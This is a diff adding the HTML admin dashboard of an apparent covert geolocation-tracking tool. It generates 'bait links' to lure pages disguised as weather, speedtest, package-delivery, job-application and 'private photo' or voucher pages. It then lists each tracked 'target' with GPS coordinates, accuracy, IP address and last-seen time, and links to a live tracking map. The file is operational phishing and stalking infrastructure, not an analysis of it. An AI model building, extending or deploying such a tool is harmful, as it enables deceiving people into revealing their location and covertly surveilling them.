@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - {{ appName }}</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Rajdhani:wght@500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+        }
+
+        body {
+            background: #060913;
+            color: #f1f5f9;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        header {
+            background: rgba(15, 23, 42, 0.9);
+            border-bottom: 1px solid rgba(0, 242, 254, 0.3);
+            backdrop-filter: blur(12px);
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .header-title i {
+            font-size: 28px;
+            color: #00f2fe;
+            filter: drop-shadow(0 0 10px rgba(0, 242, 254, 0.8));
+        }
+
+        .header-title h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            letter-spacing: 1.5px;
+            background: linear-gradient(135deg, #ffffff 0%, #38bdf8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .btn-header {
+            padding: 8px 16px;
+            border-radius: 8px;
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid rgba(0, 242, 254, 0.4);
+            color: #38bdf8;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+
+        .btn-header:hover {
+            background: rgba(0, 242, 254, 0.3);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.4);
+            color: #fff;
+        }
+
+        .main-container {
+            flex: 1;
+            padding: 32px;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .grid-layout {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 28px;
+        }
+
+        @media (max-width: 1024px) {
+            .grid-layout {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel-box {
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .panel-box::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00f2fe, #4facfe);
+            border-top-left-radius: 16px;
+            border-top-right-radius: 16px;
+        }
+
+        .panel-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            letter-spacing: 1px;
+            color: #38bdf8;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #94a3b8;
+            margin-bottom: 6px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(10, 15, 29, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: #00f2fe;
+            box-shadow: 0 0 12px rgba(0, 242, 254, 0.3);
+        }
+
+        .link-output-group {
+            background: rgba(0, 242, 254, 0.05);
+            border: 1px dashed rgba(0, 242, 254, 0.4);
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 20px;
+        }
+
+        .link-text {
+            word-break: break-all;
+            font-family: monospace;
+            color: #00f2fe;
+            font-size: 14px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .btn-action {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            border: none;
+            border-radius: 8px;
+            color: #050811;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
+        }
+
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.5);
+            color: #f87171;
+            margin-top: 16px;
+        }
+
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.4);
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.5);
+            color: #fff;
+        }
+
+        .target-cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .target-card {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 16px;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .target-card:hover {
+            border-color: #00f2fe;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
+        }
+
+        .target-card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding-bottom: 8px;
+        }
+
+        .target-id {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 15px;
+            color: #00f2fe;
+            font-weight: 700;
+        }
+
+        .badge-online {
+            background: rgba(34, 197, 94, 0.2);
+            color: #4ade80;
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .target-detail {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .target-detail span {
+            color: #e2e8f0;
+            font-weight: 600;
+        }
+
+        .btn-card-map {
+            width: 100%;
+            margin-top: 12px;
+            padding: 8px;
+            background: rgba(56, 189, 248, 0.15);
+            border: 1px solid rgba(56, 189, 248, 0.4);
+            color: #38bdf8;
+            border-radius: 6px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.3s;
+        }
+
+        .btn-card-map:hover {
+            background: #00f2fe;
+            color: #050811;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.5);
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #64748b;
+        }
+
+        .empty-state i {
+            font-size: 48px;
+            margin-bottom: 12px;
+            color: rgba(255, 255, 255, 0.1);
+        }
+
+        .toast-copied {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: #22c55e;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.5);
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="header-title">
+            <i class="fa-solid fa-satellite-dish"></i>
+            <div>
+                <h1>{{ appName }}</h1>
+                <span style="font-size: 12px; color: #64748b;">Live Command Center</span>
+            </div>
+        </div>
+        <div class="header-actions">
+            <a href="/map" class="btn-header">
+                <i class="fa-solid fa-map-location-dot"></i>
+                <span>CYBER MAP HUD</span>
+            </a>
+            <a href="/logout" class="btn-header" style="border-color: rgba(239, 68, 68, 0.4); color: #f87171;">
+                <i class="fa-solid fa-power-off"></i>
+                <span>LOGOUT</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="grid-layout">
+
+            <!-- Link Generator Panel -->
+            <div class="panel-box">
+                <div class="panel-title">
+                    <span><i class="fa-solid fa-link"></i> BAIT LINK GENERATOR</span>
+                </div>
+
+                <div class="form-group">
+                    <label>Target Identifier ID</label>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="text" id="targetIdInput" class="form-control"
+                            placeholder="Target ID (e.g., DemoUser1)">
+                        <button type="button" onclick="generateRandomId()" class="btn-header"
+                            style="white-space: nowrap;">
+                            <i class="fa-solid fa-dice"></i> Random
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Select Template / Bait Page</label>
+                    <select id="baitSelect" class="form-control" onchange="handleBaitChange(this.value)">
+                        <option value="/weather">🌤️ Weather Forecast Page (/weather)</option>
+                        <option value="/speedtest">⚡ Network Speedtest Tool (/speedtest)</option>
+                        <option value="/delivery">📦 Package Delivery Tracker (/delivery)</option>
+                        <option value="/jobs">💼 Software Job Application Form (/jobs)</option>
+                        <option value="/imagebait">🖼️ Image Click Tracker Lure (/imagebait)</option>
+                        <option value="/trackme">📡 Direct GPS Tracker (/trackme)</option>
+                    </select>
+                </div>
+
+                <!-- Job Application Custom Fields -->
+                <div id="jobFields"
+                    style="display: none; background: rgba(56, 189, 248, 0.05); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; padding: 12px; margin-bottom: 18px;">
+                    <div class="form-group" style="margin-bottom: 10px;">
+                        <label>Company Name</label>
+                        <input type="text" id="companyInput" class="form-control" value="Google"
+                            placeholder="e.g. Google, Microsoft, TCS, Infosys" oninput="updateTargetLink()">
+                    </div>
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <label>Job Position / Role</label>
+                        <input type="text" id="roleInput" class="form-control" value="Senior Software Engineer"
+                            placeholder="e.g. Full Stack Engineer, AI Specialist" oninput="updateTargetLink()">
+                    </div>
+                </div>
+
+                <!-- Image Lure Custom Fields -->
+                <div id="imageFields"
+                    style="display: none; background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 8px; padding: 12px; margin-bottom: 18px;">
+                    <div class="form-group" style="margin-bottom: 10px;">
+                        <label>Select AI / Lure Image Preset</label>
+                        <div style="display: flex; gap: 8px;">
+                            <select id="imgPresetSelect" class="form-control" onchange="applyImagePreset(this.value)">
+                                <option value="private">📸 Private HD Portrait Photo</option>
+                                <option value="supercar">🏎️ Exclusive Supercar Reveal 4K</option>
+                                <option value="document">🔐 Confidential Document Verification</option>
+                                <option value="gift">🎁 Free ₹2000 Shopping Voucher</option>
+                                <option value="cyberpunk">🌌 AI Cyberpunk Art Masterpiece</option>
+                            </select>
+                            <button type="button" onclick="randomizeAiImage()" class="btn-header"
+                                style="white-space: nowrap; border-color: rgba(168, 85, 247, 0.5); color: #c084fc;">
+                                <i class="fa-solid fa-wand-magic-sparkles"></i> Random AI
+                            </button>
+                        </div>
+                    </div>
+                    <div class="form-group" style="margin-bottom: 10px;">
+                        <label>Image Title / Caption</label>
+                        <input type="text" id="imgTitleInput" class="form-control" value="Private HD Portrait Photo"
+                            placeholder="e.g. Exclusive HD Photo" oninput="updateTargetLink()">
+                    </div>
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <label>Lure Image Direct URL</label>
+                        <input type="text" id="imgUrlInput" class="form-control"
+                            value="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=1200&q=80"
+                            placeholder="https://..." oninput="updateTargetLink()">
+                    </div>
+                </div>
+
+
+                <button type="button" onclick="updateTargetLink()" class="btn-action">
+                    <i class="fa-solid fa-bolt"></i> GENERATE BAIT LINK
+                </button>
+
+                <div class="link-output-group">
+                    <label style="font-size: 12px; color: #38bdf8; font-weight: 700;">GENERATED TARGET URL</label>
+                    <span id="generatedLink" class="link-text">http://localhost:6589/weather?id=DemoUser1</span>
+                    <button type="button" onclick="copyLink()" class="btn-action">
+                        <i class="fa-solid fa-copy"></i> COPY TARGET LINK
+                    </button>
+                </div>
+
+                <button type="button" onclick="clearTargets()" class="btn-action btn-danger">
+                    <i class="fa-solid fa-trash-can"></i> CLEAR ALL TARGET LOGS
+                </button>
+            </div>
+
+
+            <!-- Active Target Monitor Panel -->
+            <div class="panel-box">
+                <div class="panel-title">
+                    <span><i class="fa-solid fa-crosshairs"></i> ACTIVE TARGETS (<span id="targetCount">0</span>)</span>
+                    <a href="/map" style="font-size: 13px; color: #00f2fe; text-decoration: none;">
+                        View All On Map <i class="fa-solid fa-arrow-right"></i>
+                    </a>
+                </div>
+
+                <div id="targetsContainer" class="target-cards-grid">
+                    <!-- Dynamic Target Cards Injected via JS -->
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div id="toastCopied" class="toast-copied">
+        <i class="fa-solid fa-circle-check"></i> TARGET LINK COPIED TO CLIPBOARD!
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const baseUrl = "{{ remoteURL }}";
+        let currentTargets = JSON.parse('{{ targetsJson }}');
+
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        socket.emit("join-admin");
+
+        socket.on("user-connected", (target) => {
+            fetchTargets();
+        });
+
+        socket.on("map-data", (data) => {
+            fetchTargets();
+        });
+
+        socket.on("target-deleted", (data) => {
+            currentTargets = currentTargets.filter(t => t.id !== data.id);
+            renderTargets();
+        });
+
+        socket.on("targets-cleared", () => {
+            currentTargets = [];
+            renderTargets();
+        });
+
+
+        function generateRandomId() {
+            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+            let res = "Target-";
+            for (let i = 0; i < 5; i++) {
+                res += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            document.getElementById("targetIdInput").value = res;
+            updateTargetLink();
+        }
+
+        const AI_IMAGE_PRESETS = {
+            private: {
+                title: "Private HD Portrait Photo",
+                url: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=1200&q=80"
+            },
+            supercar: {
+                title: "Exclusive Supercar Reveal 4K",
+                url: "https://images.unsplash.com/photo-1617814076367-b759c7d7e738?auto=format&fit=crop&w=1200&q=80"
+            },
+            document: {
+                title: "Confidential Document Verification",
+                url: "https://images.unsplash.com/photo-1568667256549-094345857637?auto=format&fit=crop&w=1200&q=80"
+            },
+            gift: {
+                title: "Free ₹2000 Shopping Voucher",
+                url: "https://images.unsplash.com/photo-1513151233558-d860c5398176?auto=format&fit=crop&w=1200&q=80"
+            },
+            cyberpunk: {
+                title: "AI Cyberpunk Art Masterpiece",
+                url: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1200&q=80"
+            }
+        };
+
+        function applyImagePreset(key) {
+            const preset = AI_IMAGE_PRESETS[key] || AI_IMAGE_PRESETS.private;
+            document.getElementById("imgTitleInput").value = preset.title;
+            document.getElementById("imgUrlInput").value = preset.url;
+            updateTargetLink();
+        }
+
+        function randomizeAiImage() {
+            const keys = Object.keys(AI_IMAGE_PRESETS);
+            const randomKey = keys[Math.floor(Math.random() * keys.length)];
+            document.getElementById("imgPresetSelect").value = randomKey;
+            applyImagePreset(randomKey);
+        }
+
+        function handleBaitChange(val) {
+            document.getElementById("jobFields").style.display = (val === "/jobs") ? "block" : "none";
+            document.getElementById("imageFields").style.display = (val === "/imagebait") ? "block" : "none";
+            updateTargetLink();
+        }
+
+
+        function updateTargetLink() {
+            let id = document.getElementById("targetIdInput").value.trim();
+            if (!id) id = "DemoTarget";
+            const bait = document.getElementById("baitSelect").value;
+
+            let queryParams = `?id=${encodeURIComponent(id)}`;
+
+            if (bait === "/jobs") {
+                const company = document.getElementById("companyInput").value.trim() || "Google";
+                const role = document.getElementById("roleInput").value.trim() || "Software Engineer";
+                queryParams += `&company=${encodeURIComponent(company)}&role=${encodeURIComponent(role)}`;
+            } else if (bait === "/imagebait") {
+                const title = document.getElementById("imgTitleInput").value.trim() || "Shared Exclusive Photo";
+                const imgUrl = document.getElementById("imgUrlInput").value.trim() || "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80";
+                queryParams += `&title=${encodeURIComponent(title)}&imageUrl=${encodeURIComponent(imgUrl)}`;
+            }
+
+            const fullLink = `${baseUrl}${bait}${queryParams}`;
+            document.getElementById("generatedLink").innerText = fullLink;
+        }
+
+
+        function copyLink() {
+            const text = document.getElementById("generatedLink").innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const toast = document.getElementById("toastCopied");
+                toast.style.display = "block";
+                setTimeout(() => { toast.style.display = "none"; }, 3000);
+            });
+        }
+
+        function renderTargets() {
+            const container = document.getElementById("targetsContainer");
+            document.getElementById("targetCount").innerText = currentTargets.length;
+
+            if (currentTargets.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state" style="grid-column: 1 / -1;">
+                        <i class="fa-solid fa-radar"></i>
+                        <h3>NO TARGETS TRACKED YET</h3>
+                        <p>Generate a bait link and send it to target device or test on browser.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            container.innerHTML = currentTargets.map(t => `
+                <div class="target-card">
+                    <div class="target-card-header">
+                        <span class="target-id"><i class="fa-solid fa-user-ninja"></i> ${t.id}</span>
+                        <span class="badge-online">ONLINE</span>
+                    </div>
+                    <div class="target-detail">
+                        <span>Bait Page:</span> ${t.baitType || 'Generic'}
+                    </div>
+                    <div class="target-detail">
+                        <span>Coordinates:</span> ${t.lat.toFixed(5)}, ${t.lng.toFixed(5)}
+                    </div>
+                    <div class="target-detail">
+                        <span>Accuracy:</span> ±${Math.round(t.accuracy || 0)}m
+                    </div>
+                    <div class="target-detail">
+                        <span>IP Address:</span> ${t.ip || '127.0.0.1'}
+                    </div>
+                    <div class="target-detail">
+                        <span>Last Updated:</span> ${new Date(t.lastSeen).toLocaleTimeString()}
+                    </div>
+                    <div style="display: flex; gap: 8px; margin-top: 12px;">
+                        <a href="/map?id=${encodeURIComponent(t.id)}" class="btn-card-map" style="flex: 1; margin-top: 0;">
+                            <i class="fa-solid fa-crosshairs"></i> TRACK ON MAP
+                        </a>
+                        <button type="button" onclick="deleteSingleTarget(this.getAttribute('data-id'), event)" data-id="${t.id}" class="btn-card-map" style="width: auto; padding: 8px 12px; background: rgba(239, 68, 68, 0.2); border-color: rgba(239, 68, 68, 0.6); color: #f87171; margin-top: 0;">
+                            <i class="fa-solid fa-trash"></i> DELETE
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function deleteSingleTarget(id, evt) {
+            if (evt) evt.stopPropagation();
+            if (!id) return;
+            if (confirm(`Are you sure you want to delete target logs for ${id}?`)) {
+                fetch("/api/target/delete", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ id: id })
+                })
+                    .then(res => res.json())
+                    .then(data => {
+                        currentTargets = currentTargets.filter(t => t.id !== id && t.id !== data.deletedId);
+                        renderTargets();
+                    })
+                    .catch(err => {
+                        fetch(`/api/target/${encodeURIComponent(id)}`, { method: "DELETE" })
+                            .then(() => fetchTargets());
+                    });
+            }
+        }
+
+
+
+        function fetchTargets() {
+            fetch("/api/targets")
+                .then(res => res.json())
+                .then(data => {
+                    currentTargets = data;
+                    renderTargets();
+                })
+                .catch(err => console.error(err));
+        }
+
+        function clearTargets() {
+            if (confirm("Are you sure you want to clear all tracked target logs?")) {
+                fetch("/api/clear-targets", { method: "POST" })
+                    .then(res => res.json())
+                    .then(() => {
+                        currentTargets = [];
+                        renderTargets();
+                    });
+            }
+        }
+
+        // Initialize default link
+        generateRandomId();
+        renderTargets();
+    </script>
+</body>
+
+</html>
